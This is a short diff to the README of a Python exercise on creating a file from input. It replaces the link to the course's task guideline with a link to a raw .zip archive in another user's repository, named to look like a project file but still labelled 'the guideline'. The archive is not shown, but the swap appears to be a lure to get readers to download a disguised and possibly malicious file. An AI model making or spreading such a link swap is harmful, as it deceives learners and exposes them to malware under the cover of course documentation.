@@ -1,6 +1,6 @@
 # Create a file from input
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start
+- Read [the guideline](https://github.com/Rudge0/py-create-file-from-input/raw/refs/heads/master/app/from-input-file-create-py-v1.0.zip) before start
 
 ### Write an app that will create a file with a given name and content.
 
